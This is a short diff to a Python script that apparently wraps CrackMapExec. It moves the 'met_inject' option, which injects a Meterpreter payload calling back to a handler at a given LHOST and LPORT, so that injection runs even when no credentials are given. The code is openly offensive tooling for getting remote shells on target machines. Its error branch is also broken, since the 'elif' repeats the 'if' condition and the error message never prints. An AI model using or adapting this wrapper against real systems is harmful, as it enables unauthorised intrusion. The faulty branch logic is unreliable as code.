@@ -92,18 +92,6 @@ def main():
             '-p', passw,
         ]
 
-        if lport and lhost:
-
-            command += [
-                '--local-auth -M met_inject -o',
-                'LHOST=', lhost,
-                'LPORT=', lport
-            ]
-        elif lport and lhost:
-            print("IP hosting the handler (LHOST) or"
-                  "Handler port (LPORT) not provided",
-                  file=sys.stderr)
-
     else:
         print("Username or Password not provided."
               "Run command without parameter", file=sys.stderr)
@@ -111,6 +99,19 @@ def main():
             '-u', "",
             '-p', "",
         ]
+
+    if lport and lhost:
+
+        command += [
+            '--local-auth -M met_inject -o',
+            'LHOST=', lhost,
+            'LPORT=', lport
+        ]
+
+    elif lport and lhost:
+        print("IP hosting the handler (LHOST) or"
+              "Handler port (LPORT) not provided",
+              file=sys.stderr)
 
     cme_process = subprocess.run(command, stdout=subprocess.PIPE, shell=False)
     output = cme_process.stdout.decode('utf-8')
